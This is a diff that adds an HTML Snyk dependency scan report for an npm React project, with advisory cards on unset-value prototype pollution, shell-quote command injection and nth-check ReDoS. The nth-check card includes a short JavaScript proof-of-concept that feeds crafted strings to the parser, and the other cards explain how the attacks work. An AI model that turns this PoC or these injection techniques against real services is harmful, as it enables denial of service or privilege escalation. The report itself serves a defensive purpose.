@@ -1,0 +1,3576 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="Content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Language" content="en-us">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Snyk test report</title>
+  <meta name="description" content="25 known vulnerabilities found in 31 vulnerable dependency paths.">
+  <base target="_blank">
+  <link rel="icon" type="image/png" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/favicon.png"
+    sizes="194x194">
+  <link rel="shortcut icon" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/favicon.ico">
+  <style type="text/css">
+  
+    body {
+      -moz-font-feature-settings: "pnum";
+      -webkit-font-feature-settings: "pnum";
+      font-variant-numeric: proportional-nums;
+      display: flex;
+      flex-direction: column;
+      font-feature-settings: "pnum";
+      font-size: 100%;
+      line-height: 1.5;
+      min-height: 100vh;
+      -webkit-text-size-adjust: 100%;
+      margin: 0;
+      padding: 0;
+      background-color: #F5F5F5;
+      font-family: 'Arial', 'Helvetica', Calibri, sans-serif;
+    }
+  
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+      font-weight: 500;
+    }
+  
+    a,
+    a:link,
+    a:visited {
+      border-bottom: 1px solid #4b45a9;
+      text-decoration: none;
+      color: #4b45a9;
+    }
+  
+    a:hover,
+    a:focus,
+    a:active {
+      border-bottom: 1px solid #4b45a9;
+    }
+  
+    hr {
+      border: none;
+      margin: 1em 0;
+      border-top: 1px solid #c5c5c5;
+    }
+  
+    ul {
+      padding: 0 1em;
+      margin: 1em 0;
+    }
+  
+    code {
+      background-color: #EEE;
+      color: #333;
+      padding: 0.25em 0.5em;
+      border-radius: 0.25em;
+    }
+  
+    pre {
+      background-color: #333;
+      font-family: monospace;
+      padding: 0.5em 1em 0.75em;
+      border-radius: 0.25em;
+      font-size: 14px;
+    }
+  
+    pre code {
+      padding: 0;
+      background-color: transparent;
+      color: #fff;
+    }
+  
+    a code {
+      border-radius: .125rem .125rem 0 0;
+      padding-bottom: 0;
+      color: #4b45a9;
+    }
+  
+    a[href^="http://"]:after,
+    a[href^="https://"]:after {
+      background-image: linear-gradient(transparent,transparent),url("data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20112%20109%22%3E%3Cg%20id%3D%22Page-1%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Cg%20id%3D%22link-external%22%3E%3Cg%20id%3D%22arrow%22%3E%3Cpath%20id%3D%22Line%22%20stroke%3D%22%234B45A9%22%20stroke-width%3D%2215%22%20d%3D%22M88.5%2021l-43%2042.5%22%20stroke-linecap%3D%22square%22%2F%3E%3Cpath%20id%3D%22Triangle%22%20fill%3D%22%234B45A9%22%20d%3D%22M111.2%200v50L61%200z%22%2F%3E%3C%2Fg%3E%3Cpath%20id%3D%22square%22%20fill%3D%22%234B45A9%22%20d%3D%22M66%2015H0v94h94V44L79%2059v35H15V30h36z%22%2F%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E");
+      background-repeat: no-repeat;
+      background-size: .75rem;
+      content: "";
+      display: inline-block;
+      height: .75rem;
+      margin-left: .25rem;
+      width: .75rem;
+    }
+  
+  
+  /* Layout */
+  
+    [class*=layout-container] {
+      margin: 0 auto;
+      max-width: 71.25em;
+      padding: 1.9em 1.3em;
+      position: relative;
+    }
+    .layout-container--short {
+      padding-top: 0;
+      padding-bottom: 0;
+      max-width: 48.75em;
+    }
+  
+    .layout-container--short:after {
+      display: block;
+      content: "";
+      clear: both;
+    }
+  
+  /* Header */
+  
+    .header {
+      padding-bottom: 1px;
+    }
+  
+    .paths {
+      margin-left: 8px;
+    }
+    .header-wrap {
+      display: flex;
+      flex-direction: row;
+      justify-content: space-between;
+      padding-top: 2em;
+    }
+    .project__header {
+      background-color: #4b45a9;
+      color: #fff;
+      margin-bottom: -1px;
+      padding-top: 1em;
+      padding-bottom: 0.25em;
+      border-bottom: 2px solid #BBB;
+    }
+  
+    .project__header__title {
+      overflow-wrap: break-word;
+      word-wrap: break-word;
+      word-break: break-all;
+      margin-bottom: .1em;
+      margin-top: 0;
+    }
+  
+    .timestamp {
+      float: right;
+      clear: none;
+      margin-bottom: 0;
+    }
+  
+    .meta-counts {
+      clear: both;
+      display: block;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      margin: 0 0 1.5em;
+      color: #fff;
+      clear: both;
+      font-size: 1.1em;
+    }
+  
+    .meta-count {
+      display: block;
+      flex-basis: 100%;
+      margin: 0 1em 1em 0;
+      float: left;
+      padding-right: 1em;
+      border-right: 2px solid #fff;
+    }
+  
+    .meta-count:last-child {
+      border-right: 0;
+      padding-right: 0;
+      margin-right: 0;
+    }
+  
+  /* Card */
+  
+    .card {
+      background-color: #fff;
+      border: 1px solid #c5c5c5;
+      border-radius: .25rem;
+      margin: 0 0 2em 0;
+      position: relative;
+      min-height: 40px;
+      padding: 1.5em;
+    }
+  
+    .card .label {
+      background-color: #767676;
+      border: 2px solid #767676;
+      color: white;
+      padding: 0.25rem 0.75rem;
+      font-size: 0.875rem;
+      text-transform: uppercase;
+      display: inline-block;
+      margin: 0;
+      border-radius: 0.25rem;
+    }
+  
+    .card .label__text {
+      vertical-align: text-top;
+        font-weight: bold;
+    }
+  
+    .card .label--critical {
+      background-color: #AB1A1A;
+      border-color: #AB1A1A;
+    }
+  
+    .card .label--high {
+      background-color: #CE5019;
+      border-color: #CE5019;
+    }
+  
+    .card .label--medium {
+      background-color: #D68000;
+      border-color: #D68000;
+    }
+  
+    .card .label--low {
+      background-color: #88879E;
+      border-color: #88879E;
+    }
+  
+    .severity--low {
+      border-color: #88879E;
+    }
+  
+    .severity--medium {
+      border-color: #D68000;
+    }
+  
+    .severity--high {
+      border-color: #CE5019;
+    }
+  
+    .severity--critical {
+      border-color: #AB1A1A;
+    }
+  
+    .card--vuln {
+      padding-top: 4em;
+    }
+  
+    .card--vuln .label {
+      left: 0;
+      position: absolute;
+      top: 1.1em;
+      padding-left: 1.9em;
+      padding-right: 1.9em;
+      border-radius: 0 0.25rem 0.25rem 0;
+    }
+  
+    .card--vuln .card__section h2 {
+      font-size: 22px;
+      margin-bottom: 0.5em;
+    }
+  
+    .card--vuln .card__section p {
+      margin: 0 0 0.5em 0;
+    }
+  
+    .card--vuln .card__meta {
+      padding: 0 0 0 1em;
+      margin: 0;
+      font-size: 1.1em;
+    }
+  
+    .card .card__meta__paths {
+      font-size: 0.9em;
+    }
+  
+    .card--vuln .card__title {
+      font-size: 28px;
+      margin-top: 0;
+    }
+  
+    .card--vuln .card__cta p {
+      margin: 0;
+      text-align: right;
+    }
+  
+    .source-panel {
+      clear: both;
+      display: flex;
+      justify-content: flex-start;
+      flex-direction: column;
+      align-items: flex-start;
+      padding: 0.5em 0;
+      width: fit-content;
+    }
+  
+  
+  
+  </style>
+  <style type="text/css">
+    .metatable {
+      text-size-adjust: 100%;
+      -webkit-font-smoothing: antialiased;
+      -webkit-box-direction: normal;
+      color: inherit;
+      font-feature-settings: "pnum";
+      box-sizing: border-box;
+      background: transparent;
+      border: 0;
+      font: inherit;
+      font-size: 100%;
+      margin: 0;
+      outline: none;
+      padding: 0;
+      text-align: left;
+      text-decoration: none;
+      vertical-align: baseline;
+      z-index: auto;
+      margin-top: 12px;
+      border-collapse: collapse;
+      border-spacing: 0;
+      font-variant-numeric: tabular-nums;
+      max-width: 51.75em;
+    }
+  
+    tbody {
+      text-size-adjust: 100%;
+      -webkit-font-smoothing: antialiased;
+      -webkit-box-direction: normal;
+      color: inherit;
+      font-feature-settings: "pnum";
+      border-collapse: collapse;
+      border-spacing: 0;
+      box-sizing: border-box;
+      background: transparent;
+      border: 0;
+      font: inherit;
+      font-size: 100%;
+      margin: 0;
+      outline: none;
+      padding: 0;
+      text-align: left;
+      text-decoration: none;
+      vertical-align: baseline;
+      z-index: auto;
+      display: flex;
+      flex-wrap: wrap;
+    }
+  
+    .meta-row {
+      text-size-adjust: 100%;
+      -webkit-font-smoothing: antialiased;
+      -webkit-box-direction: normal;
+      color: inherit;
+      font-feature-settings: "pnum";
+      border-collapse: collapse;
+      border-spacing: 0;
+      box-sizing: border-box;
+      background: transparent;
+      border: 0;
+      font: inherit;
+      font-size: 100%;
+      outline: none;
+      text-align: left;
+      text-decoration: none;
+      vertical-align: baseline;
+      z-index: auto;
+      display: flex;
+      align-items: start;
+      border-top: 1px solid #d3d3d9;
+      padding: 8px 0 0 0;
+      border-bottom: none;
+      margin: 8px;
+      width: 47.75%;
+    }
+  
+    .meta-row-label {
+      text-size-adjust: 100%;
+      -webkit-font-smoothing: antialiased;
+      -webkit-box-direction: normal;
+      font-feature-settings: "pnum";
+      border-collapse: collapse;
+      border-spacing: 0;
+      color: #4c4a73;
+      box-sizing: border-box;
+      background: transparent;
+      border: 0;
+      font: inherit;
+      margin: 0;
+      outline: none;
+      text-decoration: none;
+      z-index: auto;
+      align-self: start;
+      flex: 1;
+      font-size: 1rem;
+      line-height: 1.5rem;
+      padding: 0;
+      text-align: left;
+      vertical-align: top;
+      text-transform: none;
+      letter-spacing: 0;
+    }
+  
+    .meta-row-value {
+      text-size-adjust: 100%;
+      -webkit-font-smoothing: antialiased;
+      -webkit-box-direction: normal;
+      color: inherit;
+      font-feature-settings: "pnum";
+      border-collapse: collapse;
+      border-spacing: 0;
+      word-break: break-word;
+      box-sizing: border-box;
+      background: transparent;
+      border: 0;
+      font: inherit;
+      font-size: 100%;
+      margin: 0;
+      outline: none;
+      padding: 0;
+      text-align: right;
+      text-decoration: none;
+      vertical-align: baseline;
+      z-index: auto;
+    }
+  </style>
+</head>
+
+<body class="section-projects">
+  <main class="layout-stacked">
+        <div class="layout-stacked__header header">
+          <header class="project__header">
+            <div class="layout-container">
+              <a class="brand" href="https://snyk.io" title="Snyk">
+                <svg width="68px" height="35px" viewBox="0 0 68 35" version="1.1" xmlns="http://www.w3.org/2000/svg" role="img">
+                  <title>Snyk - Open Source Security</title>
+                  <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                    <g fill="#fff">
+                      <path d="M5.732,27.278 C3.445,27.278 1.589,26.885 0,26.124 L0.483,22.472 C2.163,23.296 4.056,23.689 5.643,23.689 C6.801,23.689 7.563,23.295 7.563,22.599 C7.563,20.594 0.333,21.076 0.333,15.839 C0.333,12.491 3.407,10.729 7.259,10.729 C9.179,10.729 11.161,11.249 12.444,11.704 L11.924,15.294 C10.577,14.774 8.747,14.291 7.222,14.291 C6.282,14.291 5.518,14.621 5.518,15.231 C5.518,17.208 12.903,16.815 12.903,21.925 C12.903,25.325 9.877,27.277 5.733,27.277 L5.732,27.278 Z M25.726,26.936 L25.726,17.894 C25.726,15.827 24.811,14.85 23.069,14.85 C22.219,14.85 21.329,15.09 20.719,15.46 L20.719,26.936 L15.352,26.936 L15.352,11.262 L20.602,10.83 L20.474,13.392 L20.652,13.392 C21.784,11.87 23.702,10.716 25.992,10.716 C28.736,10.716 31.112,12.416 31.112,16.436 L31.112,26.936 L25.724,26.936 L25.726,26.936 Z M61.175,26.936 L56.879,19.479 L56.446,19.479 L56.446,26.935 L51.082,26.935 L51.082,8.37 L56.447,0 L56.447,17.323 C57.515,16.017 61.112,11.059 61.112,11.059 L67.732,11.059 L61.454,17.689 L67.949,26.95 L61.175,26.95 L61.175,26.938 L61.175,26.936 Z M44.13,11.11 L41.93,18.262 C41.5,19.606 41.08,22.079 41.08,22.079 C41.08,22.079 40.75,19.516 40.292,18.172 L37.94,11.108 L31.928,11.108 L38.462,26.935 C37.572,29.04 36.199,30.815 34.369,30.815 C34.039,30.815 33.709,30.802 33.389,30.765 L31.255,34.061 C31.928,34.441 33.212,34.835 34.737,34.835 C38.703,34.835 41.359,31.627 43.215,26.885 L49.443,11.108 L44.132,11.108 L44.13,11.11 Z"></path>
+                    </g>
+                  </g>
+                </svg>
+              </a>
+              <div class="header-wrap">
+                  <h1 class="project__header__title">Snyk test report</h1>
+    
+                <p class="timestamp">May 7th 2023, 8:22:43 am</p>
+              </div>
+              <div class="source-panel">
+                <span>Scanned the following paths:</span>
+                <ul>
+                  <li class="paths">/home/circleci/project (npm)</li><li class="paths">/home/circleci/project (npm)</li><li class="paths">/home/circleci/project (npm)</li>
+                </ul>
+              </div>
+    
+              <div class="meta-counts">
+                <div class="meta-count"><span>25</span> <span>known vulnerabilities</span></div>
+                <div class="meta-count"><span>31 vulnerable dependency paths</span></div>
+                <div class="meta-count"><span>1842</span> <span>dependencies</span></div>
+              </div><!-- .meta-counts -->
+            </div><!-- .layout-container--short -->
+          </header><!-- .project__header -->
+        </div><!-- .layout-stacked__header -->
+
+    <div class="layout-container" style="padding-top: 35px;">
+      <div class="cards--vuln filter--patch filter--ignore">
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            unset-value
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-jest@26.6.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        @jest/transform@26.6.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        jest-haste-map@26.6.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        sane@4.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        anymatch@2.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        micromatch@3.1.10
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        braces@2.3.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        snapdragon@0.8.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        base@0.11.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        cache-base@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        unset-value@1.0.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Prototype Pollution via the <code>unset</code> function in <code>index.js</code>, because it allows access to object prototype properties.</p>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>__proto__</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>__proto__</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>__proto__.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        <li><p>Web browser</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>unset-value</code> to version 2.0.1 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561">GitHub Commit</a></li>
+        <li><a href="https://github.com/jonschlinkert/unset-value/issues/11">GitHub Issue</a></li>
+        <li><a href="https://github.com/jonschlinkert/unset-value/pull/12">GitHub PR</a></li>
+        <li><a href="https://github.com/jonschlinkert/unset-value/releases">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-UNSETVALUE-2400660">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Remote Code Execution (RCE)</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            shell-quote
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-dev-utils@11.0.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        shell-quote@1.7.2
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/shell-quote">shell-quote</a> is a package used to quote and parse shell commands.
+        Affected versions of this package are vulnerable to Remote Code Execution (RCE). An attacker can inject unescaped shell metacharacters through a regex designed to support Windows drive letters. If the output of this package is passed to a real shell as a quoted argument to a command with exec(), an attacker can inject arbitrary commands. This is because the Windows drive letter regex character class is <code>{A-z]</code> instead of the correct <code>{A-Za-z]</code>. Several shell metacharacters exist in the space between capital letter Z and lower case letter a, such as the backtick character.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>shell-quote</code> to version 1.7.3 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/substack/node-shell-quote/blob/master/CHANGELOG.md#173">GitHub ChangeLog</a></li>
+        <li><a href="https://github.com/substack/node-shell-quote/commit/5799416ed454aa4ec9afafc895b4e31760ea1abe">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-SHELLQUOTE-1766506">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            nth-check
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        @svgr/webpack@5.5.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        @svgr/plugin-svgo@5.5.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        svgo@1.3.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        css-select@2.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nth-check@1.0.2
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when parsing crafted invalid CSS nth-checks, due to the sub-pattern <code>\s*(?:([+-]?)\s*(\d+))?</code> in <code>RE_NTH_ELEMENT</code> with quantified overlapping adjacency.</p>
+        <h2 id="poc">PoC</h2>
+        <pre><code class="language-js">var nthCheck = require(&quot;nth-check&quot;)
+        for(var i = 1; i &lt;= 50000; i++) {
+            var time = Date.now();
+            var attack_str = &#39;2n&#39; + &#39; &#39;.repeat(i*10000)+&quot;!&quot;;
+            try {
+                nthCheck.parse(attack_str) 
+            }
+            catch(err) {
+                var time_cost = Date.now() - time;
+                console.log(&quot;attack_str.length: &quot; + attack_str.length + &quot;: &quot; + time_cost+&quot; ms&quot;)
+            }
+        }
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>nth-check</code> to version 2.0.1 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726">GitHub Commit</a></li>
+        <li><a href="https://github.com/fb55/nth-check/pull/9">GitHub PR</a></li>
+        <li><a href="https://github.com/fb55/nth-check/releases/tag/v2.0.1">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-NTHCHECK-1586032">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Improper Verification of Cryptographic Signature</h2>
+            <div class="card__section">
+        
